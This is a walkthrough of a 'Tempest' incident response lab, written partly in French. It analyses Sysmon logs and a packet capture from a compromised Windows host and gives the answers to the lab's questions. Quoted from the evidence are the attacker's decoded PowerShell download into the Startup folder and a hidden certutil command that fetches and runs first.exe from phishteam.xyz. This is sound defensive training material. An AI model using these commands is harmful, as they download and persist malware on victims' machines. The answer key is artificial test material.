## Introduction

Analyse des logs endpoint et réseau d'une machine compromise (Tempest). Rôle : Incident Responder.

---

## Preparation - Log Analysis

### Log Analysis

Processus d'identification d'anomalies (menaces, bugs, perfs) via les événements système. Chaque entrée contient un timestamp.

### Event Correlation

Identification de relations significatives entre plusieurs sources de logs (app, endpoint, réseau).

Exemple : corrélation Sysmon (Event ID 3) + Firewall logs :

|Source|Artefacts|
|---|---|
|Firewall|IP src/dst, port src/dst, protocole, action|
|Sysmon|Processus, utilisateur|
|Commun|Machine name|

-> Permet de reconstituer le scénario complet en connectant les artefacts entre sources.

---

## Preparation - Tools and Artifacts

### Compare by hash

powershell

```powershell
cd 'C:\Users\user\Desktop\Incident Files\'
Get-FileHash -Algorithm SHA256 .\capture.pcapng
```

Hashes des artefacts fournis :

| Fichier          | SHA256                                                             |
| ---------------- | ------------------------------------------------------------------ |
| `capture.pcapng` | `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6` |

### Toolset

|Catégorie|Outils|
|---|---|
|Endpoint|EvtxEcmd, Timeline Explorer, SysmonView, Event Viewer|
|Réseau|Wireshark, Brim|

### EvtxEcmd & Timeline Explorer

**EvtxEcmd** -> parse les `.evtx` en CSV/JSON/XML (CLI) **Timeline Explorer** -> GUI de filtrage/navigation sur les CSV exportés

Conversion EVTX -> CSV :

powershell

```powershell
cd C:\Tools\EvtxECmd\
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```

Chargement dans Timeline Explorer : `File > Open > sysmon.csv`

### SysmonView

Visualise les logs Sysmon sous forme graphique. Nécessite un export XML préalable via Event Viewer.

1. Event Viewer -> exporter les logs en XML
2. SysmonView : `File > Import Sysmon Event Logs` -> choisir le XML
3. Sidebar gauche -> filtrer par processus
4. Choisir image path + session GUID -> affiche la vue corrélée

### Questions
#### What is the SHA256 hash of the capture.pcapng file?

**Answer** : CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

#### What is the SHA256 hash of the sysmon.evtx file?

```powershell
Get-FileHash -Algorithm SHA256 .\sysmon.evtx 
```

**Answer** : 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F

#### What is the SHA256 hash of the windows.evtx file?

```powershell
Get-FileHash -Algorithm SHA256 .\windows.evtx
```

**Answer** : D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

---

## Initial Access - Malicious Document

### Tempest Incident

Intrusion initiée par un document malveillant :

- Extension `.doc`
- Téléchargé via `chrome.exe`
- Exécute une chaîne de commandes pour obtenir du code execution

### Investigation Guide

**Source de données :** Sysmon

**Méthodologie :**

1. Charger les logs Sysmon dans EvtxEcmd/Timeline Explorer/SysmonView
2. Suivre les processus enfants de `WinWord.exe`
3. Filtrer par `ParentProcessID` / `ProcessID` pour corréler les processus
4. Focus sur :

|Event ID|Description|
|---|---|
|1|Process Creation|
|22|DNS Queries|

### Questions
#### The user of this machine was compromised by a malicious document. What is the file name of the document?

after parsing the .evtx in csv, we can open it in timeline eplorer, then search for chrome.exe

![[tempest_t4q1.png]]

**Answer** : free_magicules.doc

#### What is the name of the compromised user and machine?

_Format: username-machine name_

we can check ine the user name column

![[tempest_t4q2.png]]

**Answer** : benimaru-tempest

#### What is the PID of the Microsoft Word process that opened the malicious document?

we can filter by its name then check in the payload data1 column

![[tempest_t4q3.png]]

**Answer** : 496

#### Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

base on EventID 22 (DNS) and the PID we can find the ipv4

![[tempest_t4q4.png]]

**Answer** : 167.71.199.191

#### What is the base64 encoded string in the malicious payload executed by the document?

we can find this in the payload data4 with the parents PID 496

**Answer** : JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

#### What is the CVE number of the exploit used by the attacker to achieve a remote code execution?

lets decode the base64 string with cyberchef

```powershell
$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
```

searching on internet i found this cve

**Answer** : 2022-30190

---

## Initial Access - Stage 2 execution

### Malicious Document - Stage 2

- Commande encodée en base64 exécutée par le document
- Décodage -> révèle la chaîne de commandes exacte

### Investigation Guide

**Source de données :** Sysmon

**Méthodologie :**

1. L'autostart execution a `explorer.exe` comme parent process
2. Chercher les processus enfants de `explorer.exe` dans la fenêtre temporelle
3. Focus sur :

|Event ID|Description|
|---|---|
|1|Process Creation|
|11|File Creation|

-> Inspecter les Event ID 1 et 11 qui suivent l'exécution du document

### Questions
#### The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?

refer to the decoded command we can find the path

**Answer** : C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

#### The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

_Format: Remove the double quotes from the log._

explorer is the parent and benimaru is the user, we can filter this with the eventid 1

**Answer** : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f ‘[http[://]phishteam[.]xyz/02dcf07/first.exe’](http://phishteam.xyz/02dcf07/first.exe') C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

#### Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

![[tempest_t5q3.png]]

**Answer** : CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

#### The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?

_Format: domain:port_

with the image as first.exe and eventid 22 as filter, we can find the domain and the port

**Answer** : resolvecyber.xyz:80

---

## Initial Access - Malicious Document Traffic

### Malicious Document Traffic

- Domaine + IP du payload stage 2 identifiés dans les logs Sysmon
- Deux couples domaine/IP distincts : un pour le doc malveillant, un pour le stage 2

### Investigation Guide

**Source de données :** Packet Capture (Wireshark + Brim)

**Méthodologie :**

1. Utiliser les domaines/IP récoltés dans Sysmon comme pivot
2. Rechercher les événements réseau correspondants dans la capture

Filtre Brim :

```
_path=="http" "<malicious domain>"
```

### Questions
#### What is the URL of the malicious payload embedded in the document?

open brim and add this filter

![[tempest_t6q6.png]]


**Answer** : http://phishteam.xyz/02dcf07/index.html

#### What is the encoding used by the attacker on the c2 connection?


**Answer** : base64

#### The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

**Answer** : q


#### The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?


**Answer** : /9ab62b5

#### What is the HTTP method used by the binary?

**Answer** : GET

#### Based on the user agent, what programming language was used by the attacker to compile the binary? 

_Format: Answer in lowercase_

**Answer** : nim

---

## Discovery - Internal Reconnaissance

### Internal Reconnaissance

- Le binaire malveillant utilise en continu le trafic C2
- Les commandes et outputs de l'attaquant transitent en encodé -> décodable facilement

### Investigation Guide

**Sources de données :** Packet Capture + Sysmon

**Méthodologie :**

1. Trouver les événements réseau et processus connectés au domaine malveillant
2. Repérer le trafic contenant une commande encodée
3. Chercher des commandes d'énumération endpoint (l'attaquant est déjà dans la machine)

Filtre Brim -> tous les appels HTTP vers le C2 :

```
_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts
```


---

## Privilege Escalation - Exploiting Privileges

### Privilege Escalation

L'attaquant a établi un shell stable via un reverse socks proxy.

### Investigation Guide

**Sources de données :** Packet Capture + Sysmon

**Méthodologie :**

1. Chercher les événements exécutés après le reverse socks proxy
2. Identifier les tentatives de privilege escalation -> l'attaquant a déjà un accès persistant en low-privilege

---

## Actions on Objective - Fully-owned Machine

### Fully-Owned Machine

L'attaquant a les privilèges admin. Objectif : identifier toutes les techniques de persistance utilisées. Les exécutions inhabituelles sont liées au binaire C2 utilisé pendant le privilege escalation.

### Investigation Guide

**Sources de données :** Packet Capture + Sysmon + Windows Event Logs

**Méthodologie :**

1. Contexte utilisateur des exécutions malveillantes -> `NT Authority\System`
2. Inspecter tous les événements enfants du nouveau binaire C2
3. Chercher les techniques de persistance mises en place

Filtre Brim -> trafic C2 post-escalation :

```
_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts
```

---

